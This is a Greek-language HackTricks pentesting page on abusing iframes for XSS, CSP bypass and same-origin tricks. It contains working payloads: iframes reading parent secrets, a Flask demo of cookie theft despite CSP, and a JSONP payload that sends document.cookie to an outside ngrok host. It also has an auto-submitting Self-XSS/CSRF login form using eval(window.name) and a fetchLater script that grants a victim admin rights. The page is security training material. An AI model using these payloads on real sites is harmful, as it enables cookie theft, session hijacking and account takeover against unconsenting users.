# Iframes in XSS, CSP and SOP

{{#include ../../banners/hacktricks-training.md}}

## Iframes in XSS

Υπάρχουν 3 τρόποι για να υποδείξετε το περιεχόμενο μιας σελίδας που είναι ενσωματωμένη σε iframe:

- Μέσω `src` που υποδεικνύει μια διεύθυνση URL (η διεύθυνση URL μπορεί να είναι διασυνοριακή ή ίδια προέλευση)
- Μέσω `src` που υποδεικνύει το περιεχόμενο χρησιμοποιώντας το πρωτόκολλο `data:`
- Μέσω `srcdoc` που υποδεικνύει το περιεχόμενο

**Accesing Parent & Child vars**
```html
<html>
<script>
var secret = "31337s3cr37t"
</script>

<iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
<iframe id="if2" src="child.html"></iframe>
<iframe
id="if3"
srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
<iframe
id="if4"
src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

<script>
function access_children_vars() {
alert(if1.secret)
alert(if2.secret)
alert(if3.secret)
alert(if4.secret)
}
setTimeout(access_children_vars, 3000)
</script>
</html>
```

```html
<!-- content of child.html -->
<script>
var secret = "child secret"
alert(parent.secret)
</script>
```
Αν αποκτήσετε πρόσβαση στο προηγούμενο html μέσω ενός http server (όπως το `python3 -m http.server`), θα παρατηρήσετε ότι όλα τα scripts θα εκτελούνται (καθώς δεν υπάρχει CSP που να το αποτρέπει)., **ο γονέας δεν θα μπορεί να έχει πρόσβαση στη μεταβλητή `secret` μέσα σε οποιοδήποτε iframe** και **μόνο τα iframes if2 & if3 (τα οποία θεωρούνται ότι είναι στον ίδιο ιστότοπο) μπορούν να έχουν πρόσβαση στο secret** στο αρχικό παράθυρο.\
Σημειώστε πώς το if4 θεωρείται ότι έχει `null` προέλευση.

### Iframes με CSP <a href="#iframes_with_csp_40" id="iframes_with_csp_40"></a>

> [!TIP]
> Παρακαλώ, σημειώστε πώς στις παρακάτω παρακάμψεις η απάντηση στη σελίδα που είναι ενσωματωμένη σε iframe δεν περιέχει κανένα CSP header που να αποτρέπει την εκτέλεση JS.

Η τιμή `self` του `script-src` δεν θα επιτρέψει την εκτέλεση του JS κώδικα χρησιμοποιώντας το πρωτόκολλο `data:` ή το χαρακτηριστικό `srcdoc`.\
Ωστόσο, ακόμη και η τιμή `none` του CSP θα επιτρέψει την εκτέλεση των iframes που βάζουν μια διεύθυνση URL (ολοκληρωμένη ή απλώς τη διαδρομή) στο χαρακτηριστικό `src`.\
Επομένως, είναι δυνατόν να παρακαμφθεί το CSP μιας σελίδας με:
```html
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='" />
</head>
<script>
var secret = "31337s3cr37t"
</script>
<iframe id="if1" src="child.html"></iframe>
<iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
<iframe
id="if3"
srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
<iframe
id="if4"
src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>
```
Σημειώστε ότι η **προηγούμενη CSP επιτρέπει μόνο την εκτέλεση του inline script**.\
Ωστόσο, **μόνο τα scripts `if1` και `if2` θα εκτελούνται, αλλά μόνο το `if1` θα μπορεί να έχει πρόσβαση στο γονικό μυστικό**.

![](<../../images/image (372).png>)

Επομένως, είναι δυνατόν να **παρακαμφθεί μια CSP αν μπορείτε να ανεβάσετε ένα αρχείο JS στον διακομιστή και να το φορτώσετε μέσω iframe ακόμη και με `script-src 'none'`**. Αυτό μπορεί **πιθανώς να γίνει επίσης εκμεταλλευόμενοι ένα endpoint JSONP της ίδιας τοποθεσίας**.

Μπορείτε να το δοκιμάσετε με το παρακάτω σενάριο όπου ένα cookie κλέβεται ακόμη και με `script-src 'none'`. Απλά εκτελέστε την εφαρμογή και αποκτήστε πρόσβαση σε αυτήν με τον περιηγητή σας:
```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
resp.headers['Content-Security-Policy'] = "script-src 'self'"
resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
return resp

@app.route("/cookie_s.html")
def cookie_s():
return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
app.run()
```
### Άλλες Payloads που βρέθηκαν στην άγρια φύση <a href="#other_payloads_found_on_the_wild_64" id="other_payloads_found_on_the_wild_64"></a>
```html
<!-- This one requires the data: scheme to be allowed -->
<iframe
srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='
<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe
src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```
### Iframe sandbox

Το περιεχόμενο μέσα σε ένα iframe μπορεί να υποβληθεί σε επιπλέον περιορισμούς μέσω της χρήσης του χαρακτηριστικού `sandbox`. Από προεπιλογή, αυτό το χαρακτηριστικό δεν εφαρμόζεται, πράγμα που σημαίνει ότι δεν υπάρχουν περιορισμοί.

Όταν χρησιμοποιείται, το χαρακτηριστικό `sandbox` επιβάλλει αρκετούς περιορισμούς:

- Το περιεχόμενο αντιμετωπίζεται σαν να προέρχεται από μια μοναδική πηγή.
- Οποιαδήποτε προσπάθεια υποβολής φορμών αποκλείεται.
- Η εκτέλεση σεναρίων απαγορεύεται.
- Η πρόσβαση σε ορισμένα APIs είναι απενεργοποιημένη.
- Αποτρέπει τους συνδέσμους από το να αλληλεπιδρούν με άλλα περιβάλλοντα περιήγησης.
- Η χρήση plugins μέσω των `<embed>`, `<object>`, `<applet>`, ή παρόμοιων ετικετών απαγορεύεται.
- Η πλοήγηση του περιεχομένου στο ανώτατο επίπεδο περιβάλλοντος περιήγησης από το ίδιο το περιεχόμενο αποτρέπεται.
- Χαρακτηριστικά που ενεργοποιούνται αυτόματα, όπως η αναπαραγωγή βίντεο ή η αυτόματη εστίαση των ελέγχων φορμών, αποκλείονται.

Η τιμή του χαρακτηριστικού μπορεί να αφεθεί κενή (`sandbox=""`) για να εφαρμοστούν όλοι οι παραπάνω περιορισμοί. Εναλλακτικά, μπορεί να οριστεί σε μια λίστα συγκεκριμένων τιμών διαχωρισμένων με κενά που απαλλάσσουν το iframe από ορισμένους περιορισμούς.
```html
<iframe src="demo_iframe_sandbox.htm" sandbox></iframe>
```
### Credentialless iframes

Όπως εξηγείται σε [αυτό το άρθρο](https://blog.slonser.info/posts/make-self-xss-great-again/), η σημαία `credentialless` σε ένα iframe χρησιμοποιείται για να φορτώσει μια σελίδα μέσα σε ένα iframe χωρίς να στείλει διαπιστευτήρια στην αίτηση, διατηρώντας την πολιτική ίδιων προελεύσεων (SOP) της φορτωμένης σελίδας στο iframe.

Αυτό επιτρέπει στο iframe να έχει πρόσβαση σε ευαίσθητες πληροφορίες από ένα άλλο iframe στην ίδια SOP που έχει φορτωθεί στη γονική σελίδα:
```javascript
window.top[1].document.body.innerHTML = 'Hi from credentialless';
alert(window.top[1].document.cookie);
```
- Παράδειγμα εκμετάλλευσης: Self-XSS + CSRF

Σε αυτή την επίθεση, ο επιτιθέμενος προετοιμάζει μια κακόβουλη ιστοσελίδα με 2 iframes:

- Ένα iframe που φορτώνει τη σελίδα του θύματος με τη σημαία `credentialless` με ένα CSRF που ενεργοποιεί ένα XSS (Φανταστείτε ένα Self-XSS στο όνομα χρήστη του χρήστη):
```html
<html>
<body>
<form action="http://victim.domain/login" method="POST">
<input type="hidden" name="username" value="attacker_username<img src=x onerror=eval(window.name)>" />
<input type="hidden" name="password" value="Super_s@fe_password" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

- Ένα άλλο iframe που στην πραγματικότητα έχει τον χρήστη συνδεδεμένο (χωρίς τη σημαία `credentialless`).

Έτσι, από το XSS είναι δυνατή η πρόσβαση στο άλλο iframe καθώς έχουν την ίδια SOP και η κλοπή του cookie για παράδειγμα εκτελώντας:
```javascript
alert(window.top[1].document.cookie);
```
### fetchLater Attack

Όπως αναφέρεται σε [αυτό το άρθρο](https://blog.slonser.info/posts/make-self-xss-great-again/), το API `fetchLater` επιτρέπει τη ρύθμιση ενός αιτήματος να εκτελείται αργότερα (μετά από μια συγκεκριμένη χρονική περίοδο). Επομένως, αυτό μπορεί να καταχραστεί για παράδειγμα, να συνδεθεί ένα θύμα μέσα σε μια συνεδρία επιτιθέμενου (με Self-XSS), να ρυθμιστεί ένα αίτημα `fetchLater` (για να αλλάξει τον κωδικό πρόσβασης του τρέχοντος χρήστη για παράδειγμα) και να αποσυνδεθεί από τη συνεδρία του επιτιθέμενου. Στη συνέχεια, το θύμα συνδέεται στη δική του συνεδρία και το αίτημα `fetchLater` θα εκτελεστεί, αλλάζοντας τον κωδικό πρόσβασης του θύματος σε αυτόν που έχει ρυθμίσει ο επιτιθέμενος.

Με αυτόν τον τρόπο, ακόμη και αν η διεύθυνση URL του θύματος δεν μπορεί να φορτωθεί σε ένα iframe (λόγω CSP ή άλλων περιορισμών), ο επιτιθέμενος μπορεί να εκτελέσει ένα αίτημα στη συνεδρία του θύματος.
```javascript
var req = new Request("/change_rights",{method:"POST",body:JSON.stringify({username:"victim", rights: "admin"}),credentials:"include"})
const minute = 60000
let arr = [minute, minute * 60, minute * 60 * 24, ...]
for (let timeout of arr)
fetchLater(req,{activateAfter: timeout})
```
## Iframes στο SOP

Ελέγξτε τις παρακάτω σελίδες:

{{#ref}}
../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md
{{#endref}}

{{#ref}}
../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md
{{#endref}}

{{#ref}}
../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md
{{#endref}}

{{#ref}}
../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
